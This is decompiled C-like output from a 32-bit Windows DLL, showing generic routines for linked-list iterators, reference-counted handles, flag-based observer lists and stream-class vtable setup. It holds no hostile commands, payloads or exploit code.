int __thiscall sub_10026E10(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[3];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  this[2] = v1;
  result = *(_DWORD *)(v1 + 12);
  this[3] = result;
  return result;
}

//----- (10026E3D) --------------------------------------------------------
int __thiscall sub_10026E3D(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  this[3] = v1;
  result = *(_DWORD *)(v1 + 16);
  this[2] = result;
  return result;
}

//----- (10026E6A) --------------------------------------------------------
int *__thiscall sub_10026E6A(int this)
{
  int v2; // eax
  int v3; // edi
  int v4; // eax
  int v5; // eax
  int v6; // eax
  int *result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 12);
  if ( !v2 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v3 = *(_DWORD *)(v2 + 12);
  v4 = *(_DWORD *)(this + 8);
  if ( v4 )
    *(_DWORD *)(v4 + 12) = v3;
  if ( v3 )
    *(_DWORD *)(v3 + 16) = *(_DWORD *)(this + 8);
  v5 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v5 + 4) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v5 + 4) = v3;
  v6 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v6 + 8) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v6 + 8) = *(_DWORD *)(this + 8);
  result = *(int **)(this + 12);
  if ( result )
    result = sub_10026BE9(*(int **)(this + 12));
  *(_DWORD *)(this + 12) = v3;
  --*(_DWORD *)(*(_DWORD *)(this + 4) + 12);
  return result;
}

//----- (10026EE0) --------------------------------------------------------
_DWORD *__thiscall sub_10026EE0(_DWORD *this, int a2)
{
  _DWORD *result; // eax
  int v4; // ecx
  int v5; // ecx
  int v6[3]; // [esp-14h] [ebp-38h] BYREF
  int v7; // [esp-8h] [ebp-2Ch]
  int v8; // [esp-4h] [ebp-28h]
  int *v9; // [esp+10h] [ebp-14h]
  void *Block; // [esp+14h] [ebp-10h]
  int v11; // [esp+20h] [ebp-4h]

  ++*(_DWORD *)(this[1] + 12);
  Block = operator new(0x14u);
  v11 = 0;
  if ( Block )
  {
    v8 = this[2];
    v7 = this[3];
    v9 = v6;
    sub_1000ECB8(a2, v6);
    LOBYTE(v11) = 0;
    result = sub_100271A2(Block, v6[0], v6[1], v6[2], v7, v8);
  }
  else
  {
    result = 0;
  }
  v11 = -1;
  v4 = this[2];
  if ( v4 )
    *(_DWORD *)(v4 + 12) = result;
  else
    *(_DWORD *)(this[1] + 4) = result;
  v5 = this[3];
  this[2] = result;
  if ( v5 )
    *(_DWORD *)(v5 + 16) = result;
  else
    *(_DWORD *)(this[1] + 8) = result;
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10026F65) --------------------------------------------------------
_DWORD *__thiscall sub_10026F65(void *this, _DWORD *a2, int a3, int a4)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10094998;
  a2[1] = this;
  a2[2] = a4;
  *a2 = &off_100949D8;
  a2[3] = a3;
  return result;
}
// 10094998: using guessed type int (__thiscall *off_10094998)(void *Block, char);
// 100949D8: using guessed type int (__thiscall *off_100949D8)(void *Block, char);

//----- (10026F9F) --------------------------------------------------------
void __thiscall sub_10026F9F(_DWORD *this)
{
  *this = &off_100949D8;
  *this = &off_10094998;
}
// 10094998: using guessed type int (__thiscall *off_10094998)(void *Block, char);
// 100949D8: using guessed type int (__thiscall *off_100949D8)(void *Block, char);

//----- (10026FC4) --------------------------------------------------------
BOOL __thiscall sub_10026FC4(_DWORD *this)
{
  return this[3] == 0;
}

//----- (10026FCD) --------------------------------------------------------
BOOL __thiscall sub_10026FCD(_DWORD *this)
{
  return this[2] != 0;
}

//----- (10026FD6) --------------------------------------------------------
int __thiscall sub_10026FD6(_DWORD *this)
{
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  result = this[3];
  if ( !result )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (10026FFA) --------------------------------------------------------
int __thiscall sub_10026FFA(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[3];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  this[2] = v1;
  result = *(_DWORD *)(v1 + 12);
  this[3] = result;
  return result;
}

//----- (10027027) --------------------------------------------------------
int __thiscall sub_10027027(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  this[3] = v1;
  result = *(_DWORD *)(v1 + 16);
  this[2] = result;
  return result;
}

//----- (10027054) --------------------------------------------------------
int *__thiscall sub_10027054(int this)
{
  int v2; // eax
  int v3; // edi
  int v4; // eax
  int v5; // eax
  int v6; // eax
  int *result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 12);
  if ( !v2 )
  {
    sub_1001668F(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v3 = *(_DWORD *)(v2 + 12);
  v4 = *(_DWORD *)(this + 8);
  if ( v4 )
    *(_DWORD *)(v4 + 12) = v3;
  if ( v3 )
    *(_DWORD *)(v3 + 16) = *(_DWORD *)(this + 8);
  v5 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v5 + 4) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v5 + 4) = v3;
  v6 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v6 + 8) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v6 + 8) = *(_DWORD *)(this + 8);
  result = *(int **)(this + 12);
  if ( result )
    result = sub_10026BE9(*(int **)(this + 12));
  *(_DWORD *)(this + 12) = v3;
  --*(_DWORD *)(*(_DWORD *)(this + 4) + 12);
  return result;
}

//----- (100270CA) --------------------------------------------------------
_DWORD *__thiscall sub_100270CA(_DWORD *this, int a2)
{
  _DWORD *result; // eax
  int v4; // ecx
  int v5; // ecx
  int v6[3]; // [esp-14h] [ebp-38h] BYREF
  int v7; // [esp-8h] [ebp-2Ch]
  int v8; // [esp-4h] [ebp-28h]
  int *v9; // [esp+10h] [ebp-14h]
  void *Block; // [esp+14h] [ebp-10h]
  int v11; // [esp+20h] [ebp-4h]

  ++*(_DWORD *)(this[1] + 12);
  Block = operator new(0x14u);
  v11 = 0;
  if ( Block )
  {
    v8 = this[2];
    v7 = this[3];
    v9 = v6;
    sub_1000ECB8(a2, v6);
    LOBYTE(v11) = 0;
    result = sub_100271A2(Block, v6[0], v6[1], v6[2], v7, v8);
  }
  else
  {
    result = 0;
  }
  v11 = -1;
  v4 = this[2];
  if ( v4 )
    *(_DWORD *)(v4 + 12) = result;
  else
    *(_DWORD *)(this[1] + 4) = result;
  v5 = this[3];
  this[2] = result;
  if ( v5 )
    *(_DWORD *)(v5 + 16) = result;
  else
    *(_DWORD *)(this[1] + 8) = result;
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (1002714F) --------------------------------------------------------
_DWORD *__thiscall sub_1002714F(_DWORD *Block, char a2)
{
  sub_10026DB5(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002716E) --------------------------------------------------------
_DWORD *__thiscall sub_1002716E(_DWORD *Block, char a2)
{
  sub_10026F9F(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100271A2) --------------------------------------------------------
_DWORD *__stdcall sub_100271A2(_DWORD *a1, int a2, int a3, int a4, int a5, int a6)
{
  sub_1000ECB8((int)&a2, a1);
  a1[3] = a5;
  a1[4] = a6;
  sub_1000EA34(&a2);
  return a1;
}

//----- (100271EB) --------------------------------------------------------
_DWORD *__userpurge sub_100271EB@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10027241) --------------------------------------------------------
_DWORD *__userpurge sub_10027241@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10027280) --------------------------------------------------------
void __thiscall sub_10027280(void *this)
{
  sub_10027347((int)this);
}

//----- (100272C5) --------------------------------------------------------
_DWORD *__userpurge sub_100272C5@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);

//----- (10027304) --------------------------------------------------------
void __thiscall sub_10027304(void *this)
{
  sub_10027381((int)this);
}

//----- (10027347) --------------------------------------------------------
void __usercall sub_10027347(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10027381) --------------------------------------------------------
void __usercall sub_10027381(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (100273BD) --------------------------------------------------------
BOOL __userpurge sub_100273BD@<eax>(_DWORD *a1@<eax>, _DWORD *a2)
{
  int v2; // edi

  v2 = sub_1001A85E(a1);
  return v2 == sub_1001A85E(a2);
}

//----- (100273E8) --------------------------------------------------------
int __thiscall sub_100273E8(int *this, int a2)
{
  int v3; // ecx
  int v4; // eax
  int v6[2]; // [esp+Ch] [ebp-20h] BYREF
  _DWORD v7[3]; // [esp+14h] [ebp-18h] BYREF
  int v8; // [esp+28h] [ebp-4h]

  sub_100171BE(this, v7);
  v8 = 0;
  (*(void (__thiscall **)(int *, int *))(this[9] + 12))(this + 9, v6);
  LOBYTE(v8) = 1;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v6[0] + 4))(v6[0]) )
  {
    if ( (*(_DWORD *)((*(int (__thiscall **)(int))(*(_DWORD *)v6[0] + 12))(v6[0]) + 20) & a2) != 0 )
    {
      v4 = (*(int (__thiscall **)(int))(*(_DWORD *)v6[0] + 12))(v6[0]);
      sub_1002667B(*(_DWORD **)(v4 + 12));
    }
    sub_1000F9E1(v3, v6[0]);
  }
  LOBYTE(v8) = 0;
  sub_10010085(v6);
  v8 = -1;
  return sub_100171F2(v7);
}
// 1002745F: variable 'v3' is possibly undefined
// 100273E8: using guessed type _DWORD var_18[3];

//----- (100274A1) --------------------------------------------------------
int __thiscall sub_100274A1(int *this, int a2)
{
  int v3; // ecx
  int v4; // eax
  _DWORD v6[2]; // [esp+10h] [ebp-1Ch] BYREF
  int v7[4]; // [esp+18h] [ebp-14h] BYREF
  int v8; // [esp+28h] [ebp-4h]

  sub_100171BE(this, v6);
  v8 = 0;
  (*(void (__thiscall **)(int *, int *))(this[9] + 12))(this + 9, v7);
  LOBYTE(v8) = 1;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v7[0] + 4))(v7[0]) )
  {
    if ( (*(_DWORD *)((*(int (__thiscall **)(int))(*(_DWORD *)v7[0] + 12))(v7[0]) + 20) & a2) != 0 )
    {
      v4 = (*(int (__thiscall **)(int))(*(_DWORD *)v7[0] + 12))(v7[0]);
      sub_1002659B(*(_DWORD **)(v4 + 12));
    }
    sub_1000F9E1(v3, v7[0]);
  }
  LOBYTE(v8) = 0;
  sub_10010085(v7);
  v8 = -1;
  return sub_100171F2(v6);
}
// 100274F2: variable 'v3' is possibly undefined
// 100274A1: using guessed type _DWORD var_1C[2];

//----- (10027523) --------------------------------------------------------
int __thiscall sub_10027523(int *this)
{
  int v2; // eax
  int v3; // ecx
  _DWORD v5[2]; // [esp+10h] [ebp-1Ch] BYREF
  int v6[4]; // [esp+18h] [ebp-14h] BYREF
  int v7; // [esp+28h] [ebp-4h]

  sub_100171BE(this, v5);
  v7 = 0;
  (*(void (__thiscall **)(int *, int *))(this[9] + 12))(this + 9, v6);
  LOBYTE(v7) = 1;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v6[0] + 4))(v6[0]) )
  {
    v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v6[0] + 12))(v6[0]);
    if ( sub_10012E44(v2) )
      sub_1000F9E1(v3, v6[0]);
    else
      (*(void (__thiscall **)(int))(*(_DWORD *)v6[0] + 24))(v6[0]);
  }
  LOBYTE(v7) = 0;
  sub_10010085(v6);
  v7 = -1;
  return sub_100171F2(v5);
}
// 10027570: variable 'v3' is possibly undefined
// 10027523: using guessed type _DWORD var_1C[2];

//----- (1002759F) --------------------------------------------------------
int *__stdcall sub_1002759F(int *a1, int *a2, int a3)
{
  int v3; // eax
  _DWORD *v4; // eax
  int v5; // eax
  _DWORD *v6; // esi
  _DWORD *v7; // eax
  int v8; // ecx
  int v10[3]; // [esp+10h] [ebp-34h] BYREF
  _DWORD v11[2]; // [esp+1Ch] [ebp-28h] BYREF
  int v12; // [esp+24h] [ebp-20h] BYREF
  char v13[8]; // [esp+28h] [ebp-1Ch] BYREF
  int v14; // [esp+30h] [ebp-14h]
  int v15; // [esp+40h] [ebp-4h]
  bool v16; // [esp+4Fh] [ebp+Bh]

  v15 = 0;
  v14 = 0;
  sub_100171BE(a1, v11);
  v15 = 1;
  sub_10010046(a2, 0);
  v3 = a1[9];
  v14 = 1;
  v4 = (_DWORD *)(*(int (__thiscall **)(int *, char *))(v3 + 12))(a1 + 9, v13);
  LOBYTE(v15) = 2;
  sub_10027966(a2, v4);
  LOBYTE(v15) = 1;
  sub_10010085(v13);
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)*a2 + 4))(*a2) )
  {
    v5 = (*(int (__thiscall **)(int))(*(_DWORD *)*a2 + 12))(*a2);
    v6 = sub_1000FF31(v5, v10);
    LOBYTE(v15) = 3;
    v7 = sub_1000FF31(a3, &v12);
    LOBYTE(v15) = 4;
    v16 = sub_100273BD(v6, v7);
    LOBYTE(v15) = 3;
    sub_10001FCC(&v12);
    LOBYTE(v15) = 1;
    sub_10001FCC(v10);
    if ( v16 )
      break;
    sub_1000F9E1(v8, *a2);
  }
  LOBYTE(v15) = 0;
  sub_100171F2(v11);
  return a2;
}
// 10027651: variable 'v8' is possibly undefined
// 1002759F: using guessed type _DWORD var_28[2];
// 1002759F: using guessed type int var_34[3];

//----- (10027677) --------------------------------------------------------
int __usercall sub_10027677@<eax>(int a1@<ecx>, int *a2@<ebx>)
{
  int v3; // esi
  int v4; // esi
  _DWORD v6[2]; // [esp+10h] [ebp-20h] BYREF
  int v7[5]; // [esp+18h] [ebp-18h] BYREF
  int v8; // [esp+2Ch] [ebp-4h]

  sub_100171BE(a2, v6);
  v8 = 0;
  sub_1002759F(a2, v7, a1);
  LOBYTE(v8) = 1;
  if ( (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v7[0] + 4))(v7[0]) )
  {
    (*(void (__thiscall **)(int *, int))(a2[9] + 36))(a2 + 9, a1);
  }
  else
  {
    v3 = *(_DWORD *)(a1 + 20);
    v4 = v3 | *(_DWORD *)((*(int (__thiscall **)(int))(*(_DWORD *)v7[0] + 12))(v7[0]) + 20);
    *(_DWORD *)((*(int (__thiscall **)(int))(*(_DWORD *)v7[0] + 12))(v7[0]) + 20) = v4;
  }
  LOBYTE(v8) = 0;
  sub_10010085(v7);
  v8 = -1;
  return sub_100171F2(v6);
}
// 10027677: using guessed type _DWORD var_20[2];

//----- (100276F4) --------------------------------------------------------
int __thiscall sub_100276F4(_DWORD *this, int *a2)
{
  int v3; // esi
  int v4; // edx
  int *v6; // [esp-8h] [ebp-34h]
  volatile LONG *v7; // [esp-4h] [ebp-30h]
  _DWORD v8[2]; // [esp+10h] [ebp-1Ch] BYREF
  int *v9; // [esp+18h] [ebp-14h] BYREF
  volatile LONG *v10; // [esp+1Ch] [ebp-10h]
  int v11; // [esp+28h] [ebp-4h]

  sub_100171BE(a2, v8);
  v11 = 0;
  sub_1002759F(a2, (int *)&v9, (int)this);
  LOBYTE(v11) = 1;
  if ( !(*(unsigned __int8 (__thiscall **)(int *))(*v9 + 4))(v9) )
  {
    v3 = this[5];
    v7 = v10;
    v6 = v9;
    InterlockedIncrement(v10);
    LOBYTE(v11) = 1;
    sub_10027814(v3, v4, v6, (int)v7);
  }
  LOBYTE(v11) = 0;
  sub_10010085(&v9);
  v11 = -1;
  return sub_100171F2(v8);
}
// 10027756: variable 'v4' is possibly undefined
// 100276F4: using guessed type _DWORD var_1C[2];

//----- (1002777B) --------------------------------------------------------
int __usercall sub_1002777B@<eax>(int *a1@<ecx>, int a2@<ebx>)
{
  int v3; // ecx
  int v4; // edx
  int *v6; // [esp-8h] [ebp-38h] BYREF
  volatile LONG *v7; // [esp-4h] [ebp-34h]
  _DWORD v8[2]; // [esp+10h] [ebp-20h] BYREF
  int *v9; // [esp+18h] [ebp-18h] BYREF
  volatile LONG *v10; // [esp+1Ch] [ebp-14h]
  int **v11; // [esp+20h] [ebp-10h]
  int v12; // [esp+2Ch] [ebp-4h]

  sub_100171BE(a1, v8);
  v12 = 0;
  (*(void (__thiscall **)(int *, int **))(a1[9] + 12))(a1 + 9, &v9);
  LOBYTE(v12) = 1;
  while ( !(*(unsigned __int8 (__thiscall **)(int *))(*v9 + 4))(v9) )
  {
    if ( (a2 & *(_DWORD *)((*(int (__thiscall **)(int *))(*v9 + 12))(v9) + 20)) != 0 )
    {
      v7 = v10;
      v11 = &v6;
      v6 = v9;
      InterlockedIncrement(v10);
      LOBYTE(v12) = 1;
      sub_10027814(a2, v4, v6, (int)v7);
    }
    else
    {
      sub_1000F9E1(v3, (int)v9);
    }
  }
  LOBYTE(v12) = 0;
  sub_10010085(&v9);
  v12 = -1;
  return sub_100171F2(v8);
}
// 100277DB: variable 'v4' is possibly undefined
// 100277E5: variable 'v3' is possibly undefined
// 1002777B: using guessed type _DWORD var_20[2];

//----- (10027814) --------------------------------------------------------
void __fastcall sub_10027814(int a1, int a2, int *a3, int a4)
{
  int *v4; // edi
  int v5; // esi
  int v6; // eax

  v4 = a3;
  v5 = *(_DWORD *)((*(int (__thiscall **)(int *))(*a3 + 12))(a3) + 20) & ~a1;
  v6 = *v4;
  if ( v5 )
    *(_DWORD *)((*(int (__thiscall **)(int *))(v6 + 12))(v4) + 20) = v5;
  else
    (*(void (__thiscall **)(int *))(v6 + 24))(v4);
  sub_10010085(&a3);
}

//----- (1002785C) --------------------------------------------------------
int __userpurge sub_1002785C@<eax>(int a1@<esi>, _DWORD *a2)
{
  char v3; // [esp+7h] [ebp-15h] BYREF
  _DWORD v4[2]; // [esp+8h] [ebp-14h] BYREF
  int v5; // [esp+18h] [ebp-4h]

  *(_DWORD *)a1 = &off_100949F8;
  *(_DWORD *)(a1 + 4) = *a2;
  sub_10001520(v4);
  v5 = 0;
  sub_1000F0BC();
  sub_1001001D((__int32)&v3, (int)&v3);
  sub_100274A1((int *)dword_100BBD44, *(_DWORD *)(a1 + 4));
  *(_BYTE *)(a1 + 8) = 1;
  v5 = -1;
  sub_10001553(v4);
  return a1;
}
// 100949F8: using guessed type int (__thiscall *off_100949F8)(void *Block, char);
// 100BBD44: using guessed type int dword_100BBD44;
// 1002785C: using guessed type _DWORD var_14[2];

//----- (100278EA) --------------------------------------------------------
_DWORD *__thiscall sub_100278EA(_DWORD *Block, char a2)
{
  sub_10027930(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10027909) --------------------------------------------------------
int __usercall sub_10027909@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int result; // eax
  char v3; // [esp+1h] [ebp-1h] BYREF

  v3 = HIBYTE(a1);
  if ( *(_BYTE *)(a2 + 8) )
  {
    sub_1001001D((__int32)&v3, (int)&v3);
    result = sub_100273E8((int *)dword_100BBD44, *(_DWORD *)(a2 + 4));
    *(_BYTE *)(a2 + 8) = 0;
  }
  return result;
}
// 100BBD44: using guessed type int dword_100BBD44;

//----- (10027930) --------------------------------------------------------
int __thiscall sub_10027930(_DWORD *this)
{
  *this = &off_100949F8;
  return sub_10027909((int)this, (int)this);
}
// 100949F8: using guessed type int (__thiscall *off_100949F8)(void *Block, char);

//----- (10027966) --------------------------------------------------------
_DWORD *__usercall sub_10027966@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>)
{
  volatile LONG *v4; // [esp-4h] [ebp-8h]

  if ( *a1 != *a2 )
  {
    sub_100101FD((int)a1);
    a1[1] = a2[1];
    v4 = (volatile LONG *)a1[1];
    *a1 = *a2;
    InterlockedIncrement(v4);
  }
  return a1;
}

//----- (1002798B) --------------------------------------------------------
int __stdcall sub_1002798B(int a1, int a2, int a3)
{
  *(_DWORD *)a1 = &off_10092F00;
  *(_DWORD *)a1 = &off_100937B4;
  *(_BYTE *)(a1 + 4) = 1;
  sub_1000CE26((_DWORD *)(a1 + 8), a2);
  sub_1000CE26((_DWORD *)(a1 + 16), a3);
  *(_DWORD *)(a1 + 24) = 0;
  sub_1000CC20((_DWORD *)(a1 + 28), word_100B7020);
  return a1;
}
// 10092F00: using guessed type int (__thiscall *off_10092F00)(void *Block, char);
// 100937B4: using guessed type int (__thiscall *off_100937B4)(void *Block, char);
// 100B7020: using guessed type wchar_t word_100B7020[2];

//----- (10027A0E) --------------------------------------------------------
bool __userpurge sub_10027A0E@<al>(int a1@<esi>, void *a2)
{
  int v3; // eax
  char v4; // bl
  bool v5; // zf
  _DWORD *v6; // eax
  int v7[2]; // [esp+10h] [ebp-1Ch] BYREF
  int v8; // [esp+18h] [ebp-14h]
  int v9; // [esp+1Ch] [ebp-10h]
  int v10; // [esp+28h] [ebp-4h]

  v9 = 0;
  if ( !*(_DWORD *)(a1 + 24) )
    return 1;
  v3 = sub_1003504E(a2);
  v4 = 1;
  v5 = *(_DWORD *)(a1 + 24) == 1;
  v8 = v3;
  if ( !v5 || v3 != 1 || (v6 = sub_10034CBF(a2, v7), v10 = 0, v9 = 1, sub_1000D0B5((int)v6, a1 + 28)) )
    v4 = 0;
  v10 = -1;
  if ( (v9 & 1) != 0 )
  {
    v9 &= ~1u;
    sub_1000CE59(v7);
  }
  return v4 || *(_DWORD *)(a1 + 24) == 4 && v8 == 4 && *(_DWORD *)(a1 + 36) == sub_10034BEB(a2);
}

//----- (10027AA1) --------------------------------------------------------
BOOL __thiscall sub_10027AA1(_BYTE *this)
{
  bool v2; // bl
  _DWORD *v3; // eax
  int v5[5]; // [esp+10h] [ebp-40h] BYREF
  int v6[3]; // [esp+24h] [ebp-2Ch] BYREF
  int v7[2]; // [esp+30h] [ebp-20h] BYREF
  char v8[17]; // [esp+3Bh] [ebp-15h] BYREF
  int v9; // [esp+4Ch] [ebp-4h]

  v9 = 0;
  sub_10008671((int)v8);
  v8[0] = 1;
  if ( (unsigned __int8)sub_1001D0A7((_DWORD *)dword_100BBCF8) )
  {
    sub_1001D076(v6, (int)(this + 8));
    LOBYTE(v9) = 1;
    sub_1000CC20(v7, &word_100B7024);
    LOBYTE(v9) = 2;
    v2 = sub_1000D0B5((int)v7, (int)(this + 16)) != 0;
    LOBYTE(v9) = 1;
    sub_1000CE59(v7);
    if ( v2 )
    {
      if ( sub_10030A7E((int)v6, (int)(this + 16)) )
      {
        v3 = sub_10030ACF((int)v6, v5, (int)(this + 16));
        LOBYTE(v9) = 3;
        v8[0] = sub_10027A0E((int)this, v3);
        LOBYTE(v9) = 1;
        sub_10034AAA(v5);
      }
      else
      {
        v8[0] = 0;
      }
    }
    LOBYTE(v9) = 0;
    sub_1003078F(v6);
  }
  else
  {
    v8[0] = 0;
  }
  if ( this[4] )
    return (unsigned __int8)v8[0];
  else
    return v8[0] == 0;
}
// 100B7024: using guessed type wchar_t word_100B7024;
// 100BBCF8: using guessed type int dword_100BBCF8;
// 10027AA1: using guessed type char var_15[17];
// 10027AA1: using guessed type int var_2C[3];
// 10027AA1: using guessed type int var_40[5];

//----- (10027B8C) --------------------------------------------------------
_DWORD *__stdcall sub_10027B8C(_DWORD *a1, int a2)
{
  if ( a2 )
  {
    *a1 = &unk_1009398C;
    a1[2] = &unk_10093994;
    sub_10016441(a1 + 3);
  }
  sub_100167F9(a1, 0);
  *(_DWORD *)((char *)a1 + *(_DWORD *)(a1[2] + 4) + 8) = &off_10093974;
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_10093984;
  return a1;
}
// 10093974: using guessed type int (__stdcall *off_10093974)(char);
// 10093984: using guessed type int (__stdcall *off_10093984)(char);

//----- (10027BFC) --------------------------------------------------------
int __thiscall sub_10027BFC(_DWORD *this)
{
  int v1; // eax
  int result; // eax

  *(_DWORD *)((char *)this + *(_DWORD *)(*(this - 3) + 4) - 12) = &off_10093984;
  v1 = this != (_DWORD *)12 ? (unsigned int)(this - 1) : 0;
  *(_DWORD *)(*(_DWORD *)(*(_DWORD *)v1 + 4) + v1) = &off_10093974;
  result = *(_DWORD *)(*(this - 3) + 4);
  *(_DWORD *)((char *)this + result - 12) = &off_1009362C;
  return result;
}
// 1009362C: using guessed type int (__stdcall *off_1009362C)(char);
// 10093974: using guessed type int (__stdcall *off_10093974)(char);
// 10093984: using guessed type int (__stdcall *off_10093984)(char);

//----- (10027C51) --------------------------------------------------------
_DWORD *__stdcall sub_10027C51(_DWORD *a1)
{
  *a1 = &unk_100939A4;
  a1[2] = &unk_100939AC;
  sub_10016441(a1 + 3);
  sub_10027B8C(a1, 0);
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_1009399C;
  return a1;
}
// 1009399C: using guessed type int (__stdcall *off_1009399C)(char);

//----- (10027CA8) --------------------------------------------------------
int __thiscall sub_10027CA8(_DWORD *this)
{
  *(_DWORD *)((char *)this + *(_DWORD *)(*(this - 3) + 4) - 12) = &off_1009399C;
  return sub_10027BFC(this);
}
// 1009399C: using guessed type int (__stdcall *off_1009399C)(char);

//----- (10027CD4) --------------------------------------------------------
_DWORD *__stdcall sub_10027CD4(_DWORD *a1)
{
  *a1 = &unk_10093B78;
  a1[2] = &unk_10093B80;
  sub_10016441(a1 + 3);
  sub_10027B8C(a1, 0);
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_10093B70;
  return a1;
}
// 10093B70: using guessed type int (__stdcall *off_10093B70)(char);

//----- (10027D2B) --------------------------------------------------------
int __thiscall sub_10027D2B(_DWORD *this)
{
  *(_DWORD *)((char *)this + *(_DWORD *)(*(this - 3) + 4) - 12) = &off_10093B70;
  return sub_10027BFC(this);
}
// 10093B70: using guessed type int (__stdcall *off_10093B70)(char);

//----- (10027D57) --------------------------------------------------------
_DWORD *__stdcall sub_10027D57(_DWORD *a1)
{
  *a1 = &unk_10093B90;
  a1[2] = &unk_10093B98;
  sub_10016441(a1 + 3);
  sub_10027B8C(a1, 0);
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_10093B88;
  return a1;
}
// 10093B88: using guessed type int (__stdcall *off_10093B88)(char);

//----- (10027DAE) --------------------------------------------------------
int __thiscall sub_10027DAE(_DWORD *this)
{
  *(_DWORD *)((char *)this + *(_DWORD *)(*(this - 3) + 4) - 12) = &off_10093B88;
  return sub_10027BFC(this);
}
// 10093B88: using guessed type int (__stdcall *off_10093B88)(char);

//----- (10027DDA) --------------------------------------------------------
_DWORD *__stdcall sub_10027DDA(_DWORD *a1, int a2)
{
  if ( a2 )
  {
    *a1 = &unk_10094A04;
    a1[2] = &unk_10094A0C;
    sub_10016441(a1 + 3);
  }
  sub_10027B8C(a1, 0);
  *(_DWORD *)((char *)a1 + *(_DWORD *)(*a1 + 4)) = &off_100949FC;
  return a1;
}
// 100949FC: using guessed type int (__stdcall *off_100949FC)(char);

